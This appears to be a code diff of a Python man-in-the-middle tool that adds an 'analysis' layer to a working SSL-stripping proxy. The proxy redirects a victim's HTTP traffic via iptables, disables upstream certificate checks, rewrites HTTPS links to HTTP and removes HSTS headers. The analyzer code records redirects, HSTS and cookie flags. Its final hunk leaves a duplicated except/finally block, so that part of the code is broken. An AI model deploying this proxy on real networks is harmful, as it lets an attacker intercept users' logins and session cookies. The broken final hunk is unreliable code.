@@ -7,7 +7,10 @@ import sys
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import urllib.request
 import urllib.parse
+import ssl
 import re
+from collections import defaultdict
+from datetime import datetime
 
 # CONFIGURATION (ATTACKER MUST SET THESE)
 # NOTE: In a fully-fledged tool, these would come from argparse or network discovery.
@@ -32,6 +35,188 @@ SSL_STRIP_PORT = 8080
 ssl_strip_server = None
 https_to_http_map = {}
 
+
+# ANALYSIS DATA STRUCTURES
+class SSLStripAnalyzer:
+    """Tracks and analyzes SSL stripping feasibility and modern defenses."""
+    
+    def __init__(self):
+        self.http_requests = []  # Track all HTTP requests
+        self.https_upgrades = []  # Track HTTP→HTTPS redirects (the "bridge")
+        self.hsts_detections = {}  # Track HSTS headers by domain
+        self.cookie_analysis = []  # Track cookies and their security attributes
+        self.direct_https = []  # Track direct HTTPS attempts (HSTS preload indicator)
+        self.stripped_links = defaultdict(int)  # Count HTTPS→HTTP rewrites
+        self.attack_effectiveness = {
+            'vulnerable_sites': [],  # Sites without HSTS that could be stripped
+            'hsts_protected': [],  # Sites protected by HSTS
+            'preload_protected': [],  # Sites with HSTS preload (direct HTTPS)
+            'secure_cookies': [],  # Sites using Secure cookie attribute
+        }
+    
+    def log_http_request(self, host, path, method):
+        """Log HTTP request - potential stripping opportunity."""
+        entry = {
+            'timestamp': datetime.now().strftime('%H:%M:%S'),
+            'host': host,
+            'path': path,
+            'method': method,
+            'protocol': 'HTTP'
+        }
+        self.http_requests.append(entry)
+        print(f"[Analyzer] HTTP Request: {method} {host}{path}")
+    
+    def log_https_upgrade(self, from_url, to_url, status_code):
+        """Log HTTP→HTTPS redirect - the critical 'bridge' moment."""
+        entry = {
+            'timestamp': datetime.now().strftime('%H:%M:%S'),
+            'from': from_url,
+            'to': to_url,
+            'status': status_code,
+            'type': 'HTTP→HTTPS Bridge'
+        }
+        self.https_upgrades.append(entry)
+        print(f"\n[Analyzer]  CRITICAL: HTTP→HTTPS BRIDGE DETECTED!")
+        print(f"[Analyzer] From: {from_url}")
+        print(f"[Analyzer] To: {to_url}")
+        print(f"[Analyzer] Status: {status_code}")
+        print(f"[Analyzer] This is the t0 moment - stripping COULD work here\n")
+    
+    def log_hsts(self, domain, hsts_header):
+        """Log HSTS header detection."""
+        self.hsts_detections[domain] = {
+            'timestamp': datetime.now().strftime('%H:%M:%S'),
+            'header': hsts_header,
+            'max_age': self._parse_max_age(hsts_header)
+        }
+        print(f"[Analyzer]  HSTS Detected on {domain}")
+        print(f"[Analyzer] Header: {hsts_header}")
+        print(f"[Analyzer] Impact: Future requests will skip HTTP entirely\n")
+        
+        if domain not in self.attack_effectiveness['hsts_protected']:
+            self.attack_effectiveness['hsts_protected'].append(domain)
+    
+    def log_cookie(self, domain, cookie_name, has_secure, has_httponly):
+        """Log cookie and analyze security attributes."""
+        entry = {
+            'timestamp': datetime.now().strftime('%H:%M:%S'),
+            'domain': domain,
+            'name': cookie_name,
+            'secure': has_secure,
+            'httponly': has_httponly
+        }
+        self.cookie_analysis.append(entry)
+        
+        if has_secure:
+            print(f"[Analyzer]  Secure Cookie: {cookie_name} on {domain}")
+            print(f"[Analyzer] Impact: Cookie will NOT be sent over HTTP (protected)\n")
+            if domain not in self.attack_effectiveness['secure_cookies']:
+                self.attack_effectiveness['secure_cookies'].append(domain)
+        else:
+            print(f"[Analyzer]   Insecure Cookie: {cookie_name} on {domain}")
+            print(f"[Analyzer] Impact: Cookie WOULD be exposed over HTTP\n")
+    
+    def log_direct_https(self, host):
+        """Log direct HTTPS attempt (likely HSTS preload)."""
+        self.direct_https.append({
+            'timestamp': datetime.now().strftime('%H:%M:%S'),
+            'host': host
+        })
+        print(f"[Analyzer]  Direct HTTPS: {host}")
+        print(f"[Analyzer] Likely HSTS Preload - no HTTP 'bridge' exists\n")
+        
+        if host not in self.attack_effectiveness['preload_protected']:
+            self.attack_effectiveness['preload_protected'].append(host)
+    
+    def log_link_strip(self, url):
+        """Track when we strip HTTPS→HTTP in content."""
+        self.stripped_links[url] += 1
+    
+    def _parse_max_age(self, hsts_header):
+        """Extract max-age from HSTS header."""
+        match = re.search(r'max-age=(\d+)', hsts_header)
+        return int(match.group(1)) if match else 0
+    
+    def generate_report(self):
+        """Generate comprehensive analysis report."""
+        print("\n" + "="*80)
+        print("SSL STRIPPING FEASIBILITY ANALYSIS REPORT")
+        print("="*80)
+        
+        print(f"\n TRAFFIC SUMMARY:")
+        print(f"  • Total HTTP requests: {len(self.http_requests)}")
+        print(f"  • HTTP→HTTPS upgrades detected: {len(self.https_upgrades)}")
+        print(f"  • Direct HTTPS attempts: {len(self.direct_https)}")
+        print(f"  • HTTPS links stripped: {sum(self.stripped_links.values())}")
+        
+        print(f"\n CRITICAL 'BRIDGE' MOMENTS (t0 - where attack could work):")
+        if self.https_upgrades:
+            for upgrade in self.https_upgrades:
+                print(f"  • {upgrade['timestamp']}: {upgrade['from']} → {upgrade['to']}")
+                print(f"    Status: {upgrade['status']} (Redirect)")
+        else:
+            print(f"  • None detected - no stripping opportunities found")
+        
+        print(f"\n HSTS PROTECTION ANALYSIS:")
+        if self.hsts_detections:
+            for domain, data in self.hsts_detections.items():
+                max_age_days = data['max_age'] / 86400
+                print(f"  • {domain}:")
+                print(f"    - Max-Age: {max_age_days:.1f} days")
+                print(f"    - Effect: Browser will enforce HTTPS for this duration")
+        else:
+            print(f"  • No HSTS headers detected")
+        
+        print(f"\n COOKIE SECURITY ANALYSIS:")
+        secure_count = sum(1 for c in self.cookie_analysis if c['secure'])
+        insecure_count = sum(1 for c in self.cookie_analysis if not c['secure'])
+        print(f"  • Secure cookies (protected): {secure_count}")
+        print(f"  • Insecure cookies (vulnerable): {insecure_count}")
+        
+        if insecure_count > 0:
+            print(f"\n    Insecure cookies that COULD be stolen via HTTP:")
+            for cookie in self.cookie_analysis:
+                if not cookie['secure']:
+                    print(f"    - {cookie['name']} on {cookie['domain']}")
+        
+        print(f"\n ATTACK EFFECTIVENESS ASSESSMENT:")
+        print(f"  • Vulnerable sites (no HSTS, had HTTP bridge): "
+              f"{len([u for u in self.https_upgrades if u['from'].split('/')[2] not in self.hsts_detections])}")
+        print(f"  • HSTS-protected sites: {len(self.attack_effectiveness['hsts_protected'])}")
+        print(f"  • Preload-protected sites: {len(self.attack_effectiveness['preload_protected'])}")
+        print(f"  • Sites using Secure cookies: {len(self.attack_effectiveness['secure_cookies'])}")
+        
+        print(f"\n KEY FINDINGS:")
+        if self.https_upgrades and not self.hsts_detections:
+            print(f"  ✓ Attack COULD be effective - HTTP→HTTPS bridge exists without HSTS")
+        elif self.https_upgrades and self.hsts_detections:
+            print(f"   Attack might work ONCE, but HSTS prevents future attempts")
+        elif self.direct_https:
+            print(f"  ✗ Attack FAILS - sites using HSTS preload (no HTTP bridge)")
+        else:
+            print(f"  ? Insufficient data - need more traffic to analyze")
+        
+        print(f"\n MODERN DEFENSE MECHANISMS OBSERVED:")
+        mechanisms = []
+        if self.hsts_detections:
+            mechanisms.append("HSTS (HTTP Strict Transport Security)")
+        if self.attack_effectiveness['preload_protected']:
+            mechanisms.append("HSTS Preload Lists")
+        if self.attack_effectiveness['secure_cookies']:
+            mechanisms.append("Secure Cookie Attribute")
+        if self.direct_https:
+            mechanisms.append("Browser HTTPS Enforcement")
+        
+        if mechanisms:
+            for mech in mechanisms:
+                print(f"  • {mech}")
+        else:
+            print(f"  • None detected (site may be vulnerable)")
+        
+        print("\n" + "="*80 + "\n")
+
+# Initialize analyzer
+analyzer = SSLStripAnalyzer()
 # IPTABLES MANAGEMENT
 
 def manage_iptables(action):
@@ -195,14 +380,21 @@ def start_dns_spoofing():
     )
     return sniff_thread
 
-# SSL STRIPPING FUNCTIONS
-
+# SSL STRIPPING 
 class SSLStripHandler(BaseHTTPRequestHandler):
-    """HTTP Proxy handler that strips SSL/TLS from connections."""
+    """
+    HTTP Proxy that demonstrates SSL stripping while analyzing defenses.
+    
+    Key Concepts Demonstrated:
+    1. HTTP→HTTPS "bridge" moment (t0) - where attack could work
+    2. HSTS detection - modern defense mechanism
+    3. Secure cookie analysis - session protection
+    4. HSTS preload effects - no HTTP bridge exists
+    """
     
     def log_message(self, format, *args):
-        """Override to customize logging."""
-        print(f"[SSL Strip] {self.address_string()} - {format % args}")
+        """Suppress default logging."""
+        pass
     
     def do_GET(self):
         """Handle GET requests."""
@@ -212,170 +404,163 @@ class SSLStripHandler(BaseHTTPRequestHandler):
         """Handle POST requests."""
         self.handle_request('POST')
     
+    def do_CONNECT(self):
+        """
+        Handle CONNECT method - indicates direct HTTPS attempt.
+        This shows HSTS preload or user typing https://
+        """
+        host = self.path.split(':')[0]
+        analyzer.log_direct_https(host)
+        self.send_error(502, "Direct HTTPS - HSTS Preload likely in effect")
+    
     def handle_request(self, method):
-        """Core handler for proxying and stripping SSL."""
-        
-        # Extract the requested URL
+        """Core handler with analysis."""
         url = self.path
+        host = self.headers.get('Host', '')
         
-        print(f"[SSL Strip] Intercepted {method} request: {url}")
+        # Log the HTTP request
+        analyzer.log_http_request(host, url if url.startswith('/') else url, method)
         
-        # Determine if this should be proxied to HTTPS
-        if url.startswith('http://'):
-            # Check if this URL was originally HTTPS
-            original_url = https_to_http_map.get(url, url)
-            if original_url.startswith('https://'):
-                target_url = original_url
-                print(f"[SSL Strip] Mapping back to HTTPS: {target_url}")
-            else:
-                target_url = url
-        else:
-            # Relative URL - need to reconstruct
-            host = self.headers.get('Host', '')
-            target_url = f"https://{host}{url}"
-            print(f"[SSL Strip] Reconstructed URL: {target_url}")
+        # Construct full URL
+        if not url.startswith('http'):
+            url = f"http://{host}{url}"
+        
+        # Check mapping and upgrade to HTTPS for upstream
+        target_url = http_to_https_map.get(url, url)
+        if not target_url.startswith('https://'):
+            target_url = target_url.replace('http://', 'https://', 1)
         
         try:
-            # Prepare headers for the upstream request
+            # Prepare request
             headers = {}
             for header, value in self.headers.items():
                 if header.lower() not in ['host', 'connection', 'proxy-connection']:
                     headers[header] = value
             
-            # Handle POST data if present
+            from urllib.parse import urlparse
+            parsed = urlparse(target_url)
+            headers['Host'] = parsed.netloc
+            
+            # Handle POST data
             content_length = int(self.headers.get('Content-Length', 0))
             post_data = None
             if method == 'POST' and content_length > 0:
                 post_data = self.rfile.read(content_length)
-                print(f"[SSL Strip] POST data captured ({content_length} bytes)")
-                # Log credentials if present
-                if post_data:
-                    try:
-                        decoded_data = post_data.decode('utf-8')
-                        print(f"[SSL Strip] POST Data: {decoded_data}")
-                    except:
-                        print(f"[SSL Strip] Binary POST data")
+                print(f"[SSL Strip] POST data intercepted ({content_length} bytes)")
             
-            # Make the request to the real server (using HTTPS)
+            # Make HTTPS request upstream
+            ssl_context = ssl.create_default_context()
+            ssl_context.check_hostname = False
+            ssl_context.verify_mode = ssl.CERT_NONE
+            
             req = urllib.request.Request(target_url, data=post_data, headers=headers)
             
-            with urllib.request.urlopen(req, timeout=10) as response:
-                # Read the response
+            with urllib.request.urlopen(req, timeout=10, context=ssl_context) as response:
                 response_data = response.read()
                 response_headers = response.headers
+                status_code = response.getcode()
                 
-                # Modify the response to strip SSL references
-                if 'text/html' in response_headers.get('Content-Type', ''):
-                    response_text = response_data.decode('utf-8', errors='ignore')
-                    
-                    # Replace HTTPS links with HTTP
-                    modified_text = re.sub(
-                        r'https://',
-                        'http://',
-                        response_text,
-                        flags=re.IGNORECASE
-                    )
-                    
-                    # Track the mappings
-                    https_urls = re.findall(r'https://[^\s<>"\']+', response_text)
-                    for https_url in https_urls:
-                        http_url = https_url.replace('https://', 'http://')
-                        https_to_http_map[http_url] = https_url
-                    
-                    response_data = modified_text.encode('utf-8')
-                    print(f"[SSL Strip] Stripped {len(https_urls)} HTTPS links")
+                # Check for redirects (HTTP→HTTPS bridge)
+                location = response_headers.get('Location', '')
+                if location and location.startswith('https://') and status_code in [301, 302, 303, 307, 308]:
+                    analyzer.log_https_upgrade(url, location, status_code)
                 
-                # Send the response back to the victim
+                # Check for HSTS
+                if 'strict-transport-security' in response_headers:
+                    hsts_value = response_headers['strict-transport-security']
+                    analyzer.log_hsts(parsed.netloc, hsts_value)
+                
+                # Analyze cookies
+                set_cookies = response_headers.get_all('Set-Cookie')
+                if set_cookies:
+                    for cookie_str in set_cookies:
+                        cookie_name = cookie_str.split('=')[0]
+                        has_secure = 'Secure' in cookie_str or 'secure' in cookie_str
+                        has_httponly = 'HttpOnly' in cookie_str or 'httponly' in cookie_str
+                        analyzer.log_cookie(parsed.netloc, cookie_name, has_secure, has_httponly)
+                
+                # Strip HTTPS references from content
+                content_type = response_headers.get('Content-Type', '')
+                if 'text/html' in content_type:
+                    try:
+                        response_text = response_data.decode('utf-8', errors='ignore')
+                        
+                        # Find and strip HTTPS links
+                        https_urls = re.findall(r'https://[^\s<>"\']+', response_text)
+                        for https_url in https_urls:
+                            http_url = https_url.replace('https://', 'http://', 1)
+                            http_to_https_map[http_url] = https_url
+                            analyzer.log_link_strip(https_url)
+                        
+                        # Replace https:// with http://
+                        modified_text = re.sub(r'https://', 'http://', response_text, flags=re.IGNORECASE)
+                        response_data = modified_text.encode('utf-8')
+                        
+                        if https_urls:
+                            print(f"[SSL Strip] Stripped {len(https_urls)} HTTPS links")
+                    except Exception as e:
+                        print(f"[SSL Strip] Error during rewriting: {e}")
+                
+                # Send response to victim
                 self.send_response(200)
-                
-                # Forward relevant headers
                 for header, value in response_headers.items():
-                    if header.lower() not in ['transfer-encoding', 'content-encoding']:
+                    if header.lower() not in ['transfer-encoding', 'content-encoding', 
+                                             'strict-transport-security', 'connection']:
                         self.send_header(header, value)
                 
                 self.send_header('Content-Length', len(response_data))
                 self.end_headers()
                 self.wfile.write(response_data)
-                
-                print(f"[SSL Strip] Response sent ({len(response_data)} bytes)")
         
         except Exception as e:
-            print(f"[SSL Strip] Error handling request: {e}")
+            print(f"[SSL Strip] Error: {e}")
             self.send_error(502, f"Bad Gateway: {str(e)}")
 
-
 def start_ssl_strip():
-    """Start the SSL stripping proxy server."""
+    """Start the SSL stripping proxy with analysis."""
     global ssl_strip_server
     
     print(f"[SSL Strip] Starting SSL stripping proxy on port {SSL_STRIP_PORT}")
+    print(f"[SSL Strip] Mode: Analysis + Active Stripping")
+    print(f"[SSL Strip] Will track HTTP→HTTPS bridges, HSTS, and cookie security\n")
     
     try:
         ssl_strip_server = HTTPServer(('', SSL_STRIP_PORT), SSLStripHandler)
-        
-        # Run in a separate thread
         strip_thread = threading.Thread(target=ssl_strip_server.serve_forever)
         strip_thread.daemon = True
         strip_thread.start()
-        
-        print(f"[SSL Strip] Proxy server running on port {SSL_STRIP_PORT}")
         return strip_thread
-        
     except Exception as e:
         print(f"[SSL Strip] Failed to start proxy: {e}")
         return None
 
-
 def setup_ssl_strip_iptables():
-    """Configure iptables to redirect HTTP traffic to the SSL strip proxy."""
-    
-    # Redirect victim's HTTP traffic (port 80) to our proxy (port 8080)
+    """Configure iptables to redirect only HTTP traffic."""
     redirect_cmd = (
         f"sudo iptables -t nat -A PREROUTING -p tcp --dport 80 "
         f"-s {VICTIM_IP} -j REDIRECT --to-port {SSL_STRIP_PORT}"
     )
-    
-    print(f"[SSL Strip] Setting up iptables redirect: {redirect_cmd}")
+    print(f"[SSL Strip] Redirecting HTTP (port 80) to proxy")
     os.system(redirect_cmd)
-    
-    # Also redirect HTTPS traffic to HTTP proxy (force downgrade)
-    redirect_https_cmd = (
-        f"sudo iptables -t nat -A PREROUTING -p tcp --dport 443 "
-        f"-s {VICTIM_IP} -j REDIRECT --to-port {SSL_STRIP_PORT}"
-    )
-    
-    print(f"[SSL Strip] Setting up HTTPS redirect: {redirect_https_cmd}")
-    os.system(redirect_https_cmd)
-
 
 def cleanup_ssl_strip_iptables():
     """Remove SSL stripping iptables rules."""
-    
-    # Remove HTTP redirect
-    remove_http_cmd = (
+    remove_cmd = (
         f"sudo iptables -t nat -D PREROUTING -p tcp --dport 80 "
         f"-s {VICTIM_IP} -j REDIRECT --to-port {SSL_STRIP_PORT}"
     )
-    print(f"[SSL Strip] Removing HTTP redirect")
-    os.system(remove_http_cmd)
-    
-    # Remove HTTPS redirect
-    remove_https_cmd = (
-        f"sudo iptables -t nat -D PREROUTING -p tcp --dport 443 "
-        f"-s {VICTIM_IP} -j REDIRECT --to-port {SSL_STRIP_PORT}"
-    )
-    print(f"[SSL Strip] Removing HTTPS redirect")
-    os.system(remove_https_cmd)
-
+    os.system(remove_cmd)
 
 def stop_ssl_strip():
-    """Stop the SSL stripping server."""
+    """Stop the SSL stripping server and generate report."""
     global ssl_strip_server
     
     if ssl_strip_server:
-        print("[SSL Strip] Stopping proxy server...")
         ssl_strip_server.shutdown()
         ssl_strip_server = None
+    
+    # Generate comprehensive analysis report
+    analyzer.generate_report()
 
 
 # MAIN EXECUTION AND CLEANUP 
@@ -483,6 +668,12 @@ if __name__ == "__main__":
     except SystemExit:
         # This catches the clean exit from the signal handler.
         pass
+    except Exception as e:
+        print(f"\n[!!!] An unexpected error occurred: {e}")
+    finally:
+        # The finally block is the ultimate place to ensure cleanup happens
+        if not STOP_ATTACK: # Only clean up if the signal handler didn't already
+             cleanup()
     except Exception as e:
         print(f"\n[!!!] An unexpected error occurred: {e}")
     finally:
